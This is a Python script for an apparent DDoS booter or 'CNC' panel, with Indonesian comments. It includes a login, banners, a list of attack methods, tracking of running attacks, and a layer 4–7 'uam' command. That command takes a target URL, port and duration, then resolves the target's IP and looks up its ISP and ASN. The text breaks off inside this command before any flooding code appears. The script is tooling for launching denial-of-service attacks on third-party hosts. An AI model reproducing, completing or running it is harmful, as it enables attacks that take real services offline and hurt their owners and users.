# -*- coding: utf-8 -*-
from operator import index
import socket
import random
import string
import threading
import getpass
import urllib
from colorama import Fore, Back
import os,sys,time as t,re,requests,json
from requests import post
from time import sleep
from datetime import datetime, date
import codecs

# Global variable for username
logged_in_user = None  # We'll store the username here after login
ongoing_attacks = []  # List to store ongoing attack details

def read_login_data(filename):
    try:
        with open(filename, "r") as file:
            login_data = {}
            for line in file:
                username, password = line.strip().split(":")
                login_data[username] = password
            return login_data
    except FileNotFoundError:
        print(f"File {filename} tidak ditemukan.")
        return None
    except ValueError:
        print("Format data login tidak valid.")
        return None

def login(login_data):
    global logged_in_user  # Declare global variable to store logged-in username
    while True:
        os.system('clear')
        print("""\033[36m
7JGBBBBBBBBBBBBBBBBBBBBBBBBBB5&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#BGBBBBB57?J?JJY7J
7?GBBBBBBBBBBBBBBBBBBBBBBBBBBP#@@@@@@@@@@@@@@@@@@@@@@@@@@&&@@@@@B#@@@@@@@@@@@@BB#BGGBB##BBBY77YBBBGP
?75BBBBBBBBBBBBBBBBBBBBBBBBBBG5&@#@@@@@@@@@@@@@@@@@@@@@@@&#@@@@@BB@@@@@@@@@@@@#5GBB#########G55BB#BG
??7PGBBBBBBBBBBBBBBBBBBBBBBBBBGP&G#@@@@@@@@@@@@@@@@@@@@@@&&@@@@@#B@@@@@@@@&#@@@GG##############BGJ?Y
??7PGBBBBBBBBBBBBBBBBBBBBBBBBBBGGPG@&@@#&@&&@@@@@@@@@@@@@@@@@@@@&#@@@@@@@@#P&@@PG##############BG??J
7?JPGBBBBBBBBBBBBBBBBBBBBBBBBBBBBPPPP#@#JB@#&&&@&&@@@&@@@@@&&#&#&@@&@@@&B&@BG&GG################BGP5
?PBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBPYJGB&GY?P#B5YPBB#&@&#&#&#BBP55B&&G5PPPPYGGBGG############BGGPPGB##
YBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBGPY7YB#J~~7GGGGGGGGGB##BGGGGGGGGBBG7~JYG5J5GBB#########BPYY????J?J5G
PBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBGPGPB#P!!!PGGGGGGGGGGGGGGGGGGGGGB5~?YB5GPGB###########B?7JJJJYJYJJJ
GBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBGPGBB#J~!5GGGGGGGGGGBGGGGGGGGGGG77B#BBGGB#############PY??JJYJJJJ5
BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBGGGGP7~JGGGGGGGGGGGGGGGGGGGGB5!5GGGGB#################GY7JJJJJJY
BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBGPG#B7!GGGGGGGGGGGGGGGGGGGGG75PGBB####################B5?JJJJJY
GBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBPGB&&&@#?5GGGGGPPPGGGGGGGGGGGPG@BPB#BBBBB####BBB########BGY?JJJJY
YBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBPB@@&&&@@@BGPPPPPPPPPPPPPPGGG#&@&&#PGBBBBBBBBBBBBBBBBBBBBBBG??JJJY
7JGBGGGPPPGGBBBBBBBBBBBBBBBBBBBBBB5B@@@@&#B&@@BPPPPPPGGGPPPPPB##@@##&#GPBBBBBBBBBBBBBBBBBBBBBB5?JJJY
7!?PGGY777?!J5PBBBBBBBBBBBBBBBBBBB5B@@@@@#GGB&@&BPPPPPPPPPPG##BBB&####&BPBBBBBBBBBBBBBBBBBBBBBP7?JJY
??77JJ777???7775GGGGGGGGGGGBBBBBBG5B@@@@@@#GGB#@@&BPP555PB&&BGBBG######&GPBBBBBBBBBBBBBBBBBBBBP7?JJY
77??7777??????7!JBBBGGGGGGGGGGGGGGY&@@@@@@@#GBGB@@@@#BB#&@#GGGBBG########5GBBBBBBBBBBBBBBBBBBGJ7?J?Y
!7!77777777777?7!JGGGGGGGGGGGGGGG5P@@@@@@@@@BGBGB@@@@@@@#PYJY5GGG#######&G5BBBBBBBBBBBBBBBBGPJ7????Y
55YJ7!7777777777!7PGGGGGGGGGGGGG5Y#@@@@@@@@@&GGGGB@@@@@BYJ777?YGGB########YPGBBBBBBBBBBGGP5J77?????J
PGGG5?77!7777777!!PPGGGGGGGGGP55G&@@@@@@@@@@@#GGGGB&##GY?PPPPJJGGG#######&#GPPPGGGGGGGGGJ!777??????J
PPPPPPPY7!7777!!!YPPGGGGGPP55PB&@@@@@@@@@@@@@&GGGGGGGG57JPPPY75GGGB#######@@&#GP5PGGGGGG7!?????????J
PPPPPPPP57!!!!7Y5PPPPPP555PB&@@@@@@@@@@@@@@@@@BGGGGGGP?7YPPY??PGGG#&######&@@@@@#GP55PGG7!777777777J
PPPPPPPPPPY~~YPPPPP5YY5G#&@@@@@@@@@@@@@@@@@@@@&GGGGGP5?YPPPY?YGGG#@@&#####&@@@@@@@@&BP55Y??YY?77777J
PPPPPPPPPPPYJ555YY5G#&@@@@@@@@@@@@@@@@@@@@@@@@@BGGGGPJ?YPP57J5PB&@@@@#####&@@@@@@@@@@@@#BP55555Y!!7?
555555555555YYY5B&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&BGGP5?75PP?7YPB@@@@@@&#####@@@@@@@@@@@@@@@&#G555Y7~?
Y5555555YYJYP#&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&BPJ7YPPP7J5B@@@@@@@@&####&@@@@@@@@@@@@@@@@@@&BPY??
Y555YYJJ5G#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@B?YPPP5!JB@@@@@@@@@@&###&@@@@@@@@@@@@@@@@@@@@@@&B
YYJJYPB&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&&#YYPPPGY75&@@@@@@@@@@&##&&@@@@@@@@@@@@@@@@@@@@@@@&
JYG#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#PY?JPJYPPPG7JG@@@@@@@@@@@@&&&&@@@@@@@@@@@@@@@@@@@@@@@@
&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&#5?^^^7?YPPGJ75#@@@@@@@@@@@@&&&&&@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&GGP5YJJJ^~~~J!YPP5!Y?J5B&@@@@@@@@@@&&&&@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#Y?~^^^~J~~~~~J7PPPJ!7^^^?5PB#@@@@@@@&&&&&@@@@@@@@@@@@@@@@@@@@#G
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&P?^^~^!Y!~~~^7J5PPPJ7!~~^!7^!?P&@@@@@@&&&&@@@@@@@@@@@@@@@@@@&&55
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&Y?^75JP?^~~~~JJPPPPJ?~~~~~!^^^Y&@@@@@@@&&&@@@@@@@@@@@@@@@@@&B55G
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#J?:JPG5!7!^~Y5PPPPP55~~~~~7~^^J#@@@@@@@&&&@@@@@@@@@@@@@@@@#PJPGG
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&G?!7PPGP5PPJYGGPPPPPP5^^^^~J~~:?G&@@@@@@&&&@@@@@@@@@@@@@@&GY5PGGG
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#JJ?PPPPPPPPPPPPPPPPPP5777!^J7^^~Y#@@@@@@@&&@@@@@@@@@@@@@&GYPGGGGG
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&P?Y5PPGPPPPPPPPPPPPPPPPPPPPJ?5~^:!YB&@@@@@&&@@@@@@@@@@@@&5JPGGGGGG
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&YY5PPGGPPPPPPPPPPPPPPPPPPPPGPPY7~7JJB@@@@@@&&@@@&GB@@@@&GYPGGGGGGG
@@@@&@@@@@@@@@@@@@@@@@@@@@@@@@@@@#JJY5PPPPPPP555PPP5PPPPPPPPPP5PPPPP7YG&@@@@@&&@&#5YJB@@&#5PPGGGGGGG
@@@GJ5P#@@@@@@@@@@@@@@@@@@@@@@@@@&P7555PPP55555PPPP555555555PP5PPPG5YYB@@@@@@@&@&55GYJ&@&B5GGGGGGGGG
###YYP5YGB&@@@@@@@@@@@@@@@@@@@@@@@&57555PPP5555PPGP555555555555PPGPYYY#@@@@@@@&&PJGG5YB&#55GGGGGGGGG
555PPGGPPY5B&&@@@@@@@@@@@@@@@@@@@@@&P7Y55PPPP55PPPP555555555555PPPPYJJ#@@@@@@@&#JYGGGPY5P5GGGGGGGGGG
5PGGGGGGGGPPPG#&@@@@@@@@@@@@@@@@@@@@&G?J55PPP555PPP555555555555PPPPYYJ#@@@@@@&&PJ5PPPPPPPGGGGGGGGGGG
GGGGGGGGGGGGG555B&@@@@@@@@@@@@@@@@@@@@#Y?55PPPP555555555555555PPPP55JB@@@@@@@@&YYPBGBGGG5P5PGGGGGGGG
GGGGGGGGGGGGGGGP5P&@@@@@@@@@@@@@@@@@@@@&GY555PPPPP5555555PPP555PP55YB@@@@@@@@@&&&@@@@@@@&&B55PGGGGGG
GGGGGGGGGGGGGGGGG5P&@@@@@@@@@@@@@@@@@@@@@&PPP5PPPPPPPPPPPPPP55PPP5YB@@@@@@@@@@@@@@@@@@@@@@@&B55GGGGG
GGGGGGGGGGGGGGGGGPY#@@@@@@@@@@@@@@@@@@@@@@#YP5PP5555555555555PPPPYB@@@@@@@@@@@@@&@@@@@@@@@@@@&P5GGGG
GGGGGGGGGGGGGGGGGPP#@@@@@@@@@@@@@@@@@@@@@#57Y5PP555555555555PP55YG&@@@@@@@@@@@@@&@@@@@@@@@@@@@&PYPGG
GGGGGGGGGGGGGGGGG55#@@@@@@@@@@@@@@@@@@@&P7YP55PP555555555555P55YY&@@@@@@@@@@@@@@&@@@@@@@@@@@@@@&JPGG
GGGGPPPPGGGGGGGP55#&@@@@@@@@@@@@@@@@@@&G?G&#5555555555555P55P5YJ5&@@@@@@@@@@@@@@&&@@@@@@@@@@@@@&P5GG
GGPPGBGG5PP55P5PG&@@@@@@@@@@@@@@@@@@@@&PB@@&BP55555555555P5PP55?P&@@@@@@@@@@@@@@@&@@@@@@@@@@@@@@G5GG
GP5B&@@@&&&#&&&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#G555555555555PPPY&@@@@@@@@@@@@@@@@&@@@@@@@@@@@@@@B5GG
GG5G&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#BP555PPGGB#&@@@@@@@@@@@@@@@@@@@@&@@@@@@@@@@@@@&G5GG
GGGY#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&&&&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#YPGG
G55JG@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&BYYPGG
@BPB&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&&BGP5PGGGG
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#P5Y5PGGGGGG
        
""")
        username = input("Username » ")
        password = input("Password » ")
        if username in login_data and login_data[username] == password:
            logged_in_user = username  # Store the username of the logged-in user
            print(f"""
Login berhasil! Welcome, {username} 🪐!""")
            t.sleep(1)
            menu()
            main()
            return
        else:
            print("Username atau password salah. Silakan coba lagi.")
            t.sleep(1)

ip = requests.get('https://api.ipify.org').text.strip()

def methods():
    # Baca data dari file JSON
    with open('methods.json', 'r') as file:
        methods_data = json.load(file)

    print(f"""                          Methods
 {'NAME'}     │ {'DESCRIPTION'}                   │ {'DURATION'} """)
    print('──────────┼───────────────────────────────┼──────────')
    for method in methods_data:
        print(f"{method['name']:<9} │ {method['description']:<29} │ {method['duration']:<3}")

# Fungsi untuk mendapatkan ISP, ASN, org, dan country berdasarkan IP menggunakan API ip-api.com
def get_ip_info(ip):
    try:
        # URL untuk mendapatkan data dari API ip-api.com
        url = f"http://ip-api.com/json/{ip}?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,query"
        
        # Mengirim permintaan ke API ip-api.com untuk mendapatkan data IP
        response = requests.get(url)
        data = response.json()

        # Cek apakah status API berhasil atau gagal
        if data['status'] != 'success':
            return 'Unknown ASN', 'Unknown ISP', 'Unknown Org', 'Unknown Country'  # Jika gagal, kembalikan 'Unknown'

        # Mengambil informasi ISP, ASN, org, dan country
        asn = data.get('as', 'Unknown ASN')  # ASN biasanya disediakan dalam format 'ASXXXX'
        isp = data.get('isp', 'Unknown ISP')
        org = data.get('org', 'Unknown Org')  # Organisasi yang memiliki IP ini
        country = data.get('country', 'Unknown Country')  # Negara yang terkait dengan IP

        return asn, isp, org, country
    except requests.RequestException as e:
        print(f"Error fetching ASN and ISP data: {e}")
        return 'ASN Unknown', 'ISP Unknown', 'Org Unknown', 'Country Unknown'  # Jika ada kesalahan dalam permintaan

# Fungsi untuk mengekstrak IP dari URL
def get_ip_from_url(url):
    try:
        # Menggunakan socket untuk mendapatkan IP dari URL (hostname)
        hostname = url.split("://")[-1].split("/")[0]  # Menangani http/https dan menghilangkan path
        ip = socket.gethostbyname(hostname)  # Mendapatkan IP dari hostname
        return ip
    except socket.gaierror:
        print(f"Error: Unable to resolve IP for URL {url}")
        return None

# Fungsi untuk mendapatkan waktu saat ini dalam format yang diinginkan
def waktu():
    # Mendapatkan waktu saat ini dalam format yang diinginkan
    return datetime.now().strftime("%b/%d/%Y")

B = '\033[35m' #MERAH
P = '\033[1;37m' #PUTIH

# Fungsi untuk memperbarui status serangan secara otomatis
def update_attacks():
    global ongoing_attacks  # Menggunakan global variable ongoing_attacks

    while True:
        completed_attacks = []
        for attack in ongoing_attacks:
            elapsed_time = int(t.time() - attack['start_time'])

            # Jika serangan telah selesai (elapsed_time >= duration)
            if elapsed_time >= attack['duration']:
                attack['status'] = 'Completed'
                completed_attacks.append(attack)

        # Hapus serangan yang sudah selesai dari daftar ongoing_attacks
        ongoing_attacks = [attack for attack in ongoing_attacks if attack not in completed_attacks]

        # Tunggu beberapa detik sebelum mengecek kembali
        t.sleep(1)  # Bisa disesuaikan sesuai kebutuhan

# Fungsi untuk menampilkan serangan yang sedang berlangsung
def ongoing():
    global ongoing_attacks  # Menggunakan global variable ongoing_attacks

    if ongoing_attacks:
        print(f"""                      Running
 {'#'} │       {'HOST'}      │ {'SINCE'} │ {'DURATION'} │ {'METHOD'} """)
        print('───┼─────────────────┼───────┼──────────┼────────')

        # Memperbarui status serangan yang sudah selesai dan menghapusnya
        completed_attacks = []
        for attack in ongoing_attacks:
            elapsed_time = int(t.time() - attack['start_time'])

            # Jika serangan telah selesai (elapsed_time >= duration)
            if elapsed_time >= attack['duration']:
                attack['status'] = 'Completed'
                completed_attacks.append(attack)  # Menambahkan serangan yang selesai ke list 'completed_attacks'
            else:
                attack['status'] = 'Ongoing'

        # Hapus serangan yang sudah selesai dari daftar ongoing_attacks
        ongoing_attacks = [attack for attack in ongoing_attacks if attack not in completed_attacks]

        # Menampilkan serangan yang sedang berlangsung
        for i, attack in enumerate(ongoing_attacks, 1):
            elapsed_time = int(t.time() - attack['start_time'])
            print(f" {i} │ {attack['host']:>15} │  {elapsed_time:>3}  │    {attack['duration']:>3}   │ {attack['method']:<9} ")

        # Menampilkan serangan yang sudah selesai, jika ada
        for i, attack in enumerate(completed_attacks, 1):
            print(f" {i} │ {attack['host']:>15} │  {attack['duration']:>3}  │    {attack['duration']:>3}   │ {attack['method']:<9} ")

    else:
        print("(cnc) No running attacks, why not start some?")

def myinfo():
    print(f"""username={logged_in_user}
concurrents=3
timelimit=86000
cooldown=0
expiry=9999.99 Millenium(s) left
Myip={ip}:48970
Myclient=SSH-2.0-OpenSSH_9.9""")

def credits():
    print("""============CREDITS============
Version: 9.1
Creator: MrVxdx1-Xploit
Website: Coming Soon
==============END==============""")

def help():
    print("""                              Commands
 NAME     │ ALIAS              │ DESCRIPTION
──────────┼────────────────────┼────────────────────────────────────
 help     │ ----               │ display all registered commands
 methods  │ ----               │ display all registered methods
 clear    │ cls,c              │ see your amazing banner
 ongoing  │ ----               │ view running attacks
 exit     │ goodbye,imaheadout │ removes your session
 credits  │ whodoneit          │ credits
 myinfo   │ acccount,info      │ returns user info""")

def menu():
    os.system('clear')
    print(f"""\033[36m
7JGBBBBBBBBBBBBBBBBBBBBBBBBBB5&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#BGBBBBB57?J?JJY7J
7?GBBBBBBBBBBBBBBBBBBBBBBBBBBP#@@@@@@@@@@@@@@@@@@@@@@@@@@&&@@@@@B#@@@@@@@@@@@@BB#BGGBB##BBBY77YBBBGP
?75BBBBBBBBBBBBBBBBBBBBBBBBBBG5&@#@@@@@@@@@@@@@@@@@@@@@@@&#@@@@@BB@@@@@@@@@@@@#5GBB#########G55BB#BG
??7PGBBBBBBBBBBBBBBBBBBBBBBBBBGP&G#@@@@@@@@@@@@@@@@@@@@@@&&@@@@@#B@@@@@@@@&#@@@GG##############BGJ?Y
??7PGBBBBBBBBBBBBBBBBBBBBBBBBBBGGPG@&@@#&@&&@@@@@@@@@@@@@@@@@@@@&#@@@@@@@@#P&@@PG##############BG??J
7?JPGBBBBBBBBBBBBBBBBBBBBBBBBBBBBPPPP#@#JB@#&&&@&&@@@&@@@@@&&#&#&@@&@@@&B&@BG&GG################BGP5
?PBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBPYJGB&GY?P#B5YPBB#&@&#&#&#BBP55B&&G5PPPPYGGBGG############BGGPPGB##
YBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBGPY7YB#J~~7GGGGGGGGGB##BGGGGGGGGBBG7~JYG5J5GBB#########BPYY????J?J5G
PBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBGPGPB#P!!!PGGGGGGGGGGGGGGGGGGGGGB5~?YB5GPGB###########B?7JJJJYJYJJJ
GBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBGPGBB#J~!5GGGGGGGGGGBGGGGGGGGGGG77B#BBGGB#############PY??JJYJJJJ5
BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBGGGGP7~JGGGGGGGGGGGGGGGGGGGGB5!5GGGGB#################GY7JJJJJJY
BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBGPG#B7!GGGGGGGGGGGGGGGGGGGGG75PGBB####################B5?JJJJJY
GBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBPGB&&&@#?5GGGGGPPPGGGGGGGGGGGPG@BPB#BBBBB####BBB########BGY?JJJJY
YBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBPB@@&&&@@@BGPPPPPPPPPPPPPPGGG#&@&&#PGBBBBBBBBBBBBBBBBBBBBBBG??JJJY
7JGBGGGPPPGGBBBBBBBBBBBBBBBBBBBBBB5B@@@@&#B&@@BPPPPPPGGGPPPPPB##@@##&#GPBBBBBBBBBBBBBBBBBBBBBB5?JJJY
7!?PGGY777?!J5PBBBBBBBBBBBBBBBBBBB5B@@@@@#GGB&@&BPPPPPPPPPPG##BBB&####&BPBBBBBBBBBBBBBBBBBBBBBP7?JJY
??77JJ777???7775GGGGGGGGGGGBBBBBBG5B@@@@@@#GGB#@@&BPP555PB&&BGBBG######&GPBBBBBBBBBBBBBBBBBBBBP7?JJY
77??7777??????7!JBBBGGGGGGGGGGGGGGY&@@@@@@@#GBGB@@@@#BB#&@#GGGBBG########5GBBBBBBBBBBBBBBBBBBGJ7?J?Y
!7!77777777777?7!JGGGGGGGGGGGGGGG5P@@@@@@@@@BGBGB@@@@@@@#PYJY5GGG#######&G5BBBBBBBBBBBBBBBBGPJ7????Y
55YJ7!7777777777!7PGGGGGGGGGGGGG5Y#@@@@@@@@@&GGGGB@@@@@BYJ777?YGGB########YPGBBBBBBBBBBGGP5J77?????J
PGGG5?77!7777777!!PPGGGGGGGGGP55G&@@@@@@@@@@@#GGGGB&##GY?PPPPJJGGG#######&#GPPPGGGGGGGGGJ!777??????J
PPPPPPPY7!7777!!!YPPGGGGGPP55PB&@@@@@@@@@@@@@&GGGGGGGG57JPPPY75GGGB#######@@&#GP5PGGGGGG7!?????????J
PPPPPPPP57!!!!7Y5PPPPPP555PB&@@@@@@@@@@@@@@@@@BGGGGGGP?7YPPY??PGGG#&######&@@@@@#GP55PGG7!777777777J
PPPPPPPPPPY~~YPPPPP5YY5G#&@@@@@@@@@@@@@@@@@@@@&GGGGGP5?YPPPY?YGGG#@@&#####&@@@@@@@@&BP55Y??YY?77777J
PPPPPPPPPPPYJ555YY5G#&@@@@@@@@@@@@@@@@@@@@@@@@@BGGGGPJ?YPP57J5PB&@@@@#####&@@@@@@@@@@@@#BP55555Y!!7?
555555555555YYY5B&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&BGGP5?75PP?7YPB@@@@@@&#####@@@@@@@@@@@@@@@&#G555Y7~?
Y5555555YYJYP#&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&BPJ7YPPP7J5B@@@@@@@@&####&@@@@@@@@@@@@@@@@@@&BPY??
Y555YYJJ5G#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@B?YPPP5!JB@@@@@@@@@@&###&@@@@@@@@@@@@@@@@@@@@@@&B
YYJJYPB&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&&#YYPPPGY75&@@@@@@@@@@&##&&@@@@@@@@@@@@@@@@@@@@@@@&
JYG#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#PY?JPJYPPPG7JG@@@@@@@@@@@@&&&&@@@@@@@@@@@@@@@@@@@@@@@@
&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&#5?^^^7?YPPGJ75#@@@@@@@@@@@@&&&&&@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&GGP5YJJJ^~~~J!YPP5!Y?J5B&@@@@@@@@@@&&&&@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#Y?~^^^~J~~~~~J7PPPJ!7^^^?5PB#@@@@@@@&&&&&@@@@@@@@@@@@@@@@@@@@#G
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&P?^^~^!Y!~~~^7J5PPPJ7!~~^!7^!?P&@@@@@@&&&&@@@@@@@@@@@@@@@@@@&&55
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&Y?^75JP?^~~~~JJPPPPJ?~~~~~!^^^Y&@@@@@@@&&&@@@@@@@@@@@@@@@@@&B55G
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#J?:JPG5!7!^~Y5PPPPP55~~~~~7~^^J#@@@@@@@&&&@@@@@@@@@@@@@@@@#PJPGG
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&G?!7PPGP5PPJYGGPPPPPP5^^^^~J~~:?G&@@@@@@&&&@@@@@@@@@@@@@@&GY5PGGG
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#JJ?PPPPPPPPPPPPPPPPPP5777!^J7^^~Y#@@@@@@@&&@@@@@@@@@@@@@&GYPGGGGG
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&P?Y5PPGPPPPPPPPPPPPPPPPPPPPJ?5~^:!YB&@@@@@&&@@@@@@@@@@@@&5JPGGGGGG
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&YY5PPGGPPPPPPPPPPPPPPPPPPPPGPPY7~7JJB@@@@@@&&@@@&GB@@@@&GYPGGGGGGG
@@@@&@@@@@@@@@@@@@@@@@@@@@@@@@@@@#JJY5PPPPPPP555PPP5PPPPPPPPPP5PPPPP7YG&@@@@@&&@&#5YJB@@&#5PPGGGGGGG
@@@GJ5P#@@@@@@@@@@@@@@@@@@@@@@@@@&P7555PPP55555PPPP555555555PP5PPPG5YYB@@@@@@@&@&55GYJ&@&B5GGGGGGGGG
###YYP5YGB&@@@@@@@@@@@@@@@@@@@@@@@&57555PPP5555PPGP555555555555PPGPYYY#@@@@@@@&&PJGG5YB&#55GGGGGGGGG
555PPGGPPY5B&&@@@@@@@@@@@@@@@@@@@@@&P7Y55PPPP55PPPP555555555555PPPPYJJ#@@@@@@@&#JYGGGPY5P5GGGGGGGGGG
5PGGGGGGGGPPPG#&@@@@@@@@@@@@@@@@@@@@&G?J55PPP555PPP555555555555PPPPYYJ#@@@@@@&&PJ5PPPPPPPGGGGGGGGGGG
GGGGGGGGGGGGG555B&@@@@@@@@@@@@@@@@@@@@#Y?55PPPP555555555555555PPPP55JB@@@@@@@@&YYPBGBGGG5P5PGGGGGGGG
GGGGGGGGGGGGGGGP5P&@@@@@@@@@@@@@@@@@@@@&GY555PPPPP5555555PPP555PP55YB@@@@@@@@@&&&@@@@@@@&&B55PGGGGGG
GGGGGGGGGGGGGGGGG5P&@@@@@@@@@@@@@@@@@@@@@&PPP5PPPPPPPPPPPPPP55PPP5YB@@@@@@@@@@@@@@@@@@@@@@@&B55GGGGG
GGGGGGGGGGGGGGGGGPY#@@@@@@@@@@@@@@@@@@@@@@#YP5PP5555555555555PPPPYB@@@@@@@@@@@@@&@@@@@@@@@@@@&P5GGGG
GGGGGGGGGGGGGGGGGPP#@@@@@@@@@@@@@@@@@@@@@#57Y5PP555555555555PP55YG&@@@@@@@@@@@@@&@@@@@@@@@@@@@&PYPGG
GGGGGGGGGGGGGGGGG55#@@@@@@@@@@@@@@@@@@@&P7YP55PP555555555555P55YY&@@@@@@@@@@@@@@&@@@@@@@@@@@@@@&JPGG
GGGGPPPPGGGGGGGP55#&@@@@@@@@@@@@@@@@@@&G?G&#5555555555555P55P5YJ5&@@@@@@@@@@@@@@&&@@@@@@@@@@@@@&P5GG
GGPPGBGG5PP55P5PG&@@@@@@@@@@@@@@@@@@@@&PB@@&BP55555555555P5PP55?P&@@@@@@@@@@@@@@@&@@@@@@@@@@@@@@G5GG
GP5B&@@@&&&#&&&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#G555555555555PPPY&@@@@@@@@@@@@@@@@&@@@@@@@@@@@@@@B5GG
GG5G&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#BP555PPGGB#&@@@@@@@@@@@@@@@@@@@@&@@@@@@@@@@@@@&G5GG
GGGY#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&&&&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#YPGG
G55JG@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&BYYPGG
@BPB&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&&BGP5PGGGG
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#P5Y5PGGGGGG


\033[1;32mOWNER: \033[36mMrVxdx1-Xploit\033[0m
\033[1;32mUSERNAME: \033[36m{logged_in_user}\033[0m
\033[1;32mEXPIRY: \033[36m2739.73 Millennium(s)\033[0m
\033[1;32mTIMELIMIT: \033[36m86000\033[0m
\033[1;32mVIP: \033[36mtrue\033[0m
\033[1;32mCOOLDOWN: \033[36m0\033[0m
""")
    print("\033[1;36mWELCOME TO INCOGNITO")
    print("""\033[1;36m> Type "help" to start <
""")

def main():
    global ongoing_attacks
    threading.Thread(target=update_attacks, daemon=True).start()
    while True:
        sys.stdout.write(f"\x1b]2;0 boats | Succubus Custom Build | Serving {logged_in_user} | Active Sessions 2 | 9999.99 Millenium(s)\x07")
        sin = input(f"\033[48;5;15m\033[1;31m{logged_in_user}\033[0m • \033[48;5;15m\033[1;31mCat\x1b[1;40m\033[0m ➤ \x1b[1;37m\033[0m")
        sinput = sin.split(" ")[0]
        if sinput == "cls" or sinput == "c":
            os.system('clear')
            menu()
        if sinput == "stop":
            ongoing_attacks = []  # Reset ongoing attacks when stop is typed
            menu()            
        if sinput == "help":
            help()
        if sinput == "myinfo" or sinput == "account" or sinput == "info":
            myinfo()
        if sinput == "methods":
            methods()
        if sinput == "ongoing":
            ongoing()
        if sinput == "credits" or sinput == "whodoneit":
            credits()
        if sinput == "exit" or sinput == "goodbye" or sinput == "imaheadout":
            print("Goodbye !")
            break
        elif sinput == "":
            main()

#########LAYER-4 - 7########

        elif sinput == "uam" or sinput == "UAM":
            try:
                url = sin.split()[1]
                port = sin.split()[2]
                duration = int(sin.split()[3])

                # Mendapatkan IP dari URL
                ip = get_ip_from_url(url)

                if ip:
                    # Mendapatkan ISP, ASN, Org, dan Country untuk IP target
                    asn, isp, org, country = get_ip_info(ip)
                    
